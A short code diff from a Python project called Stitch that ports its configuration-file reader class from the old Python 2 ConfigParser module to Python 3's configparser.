@@ -2,11 +2,12 @@
 # Copyright (c) 2017, Nathan Lopez
 # Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
 
+import configparser
 from .stitch_utils import *
 
 class stitch_ini():
     def __init__(self):
-        self.Config = ConfigParser.ConfigParser()
+        self.Config = configparser.ConfigParser()
         self.Config.read(st_config)
         if windows_client():
             self.section = "Windows"
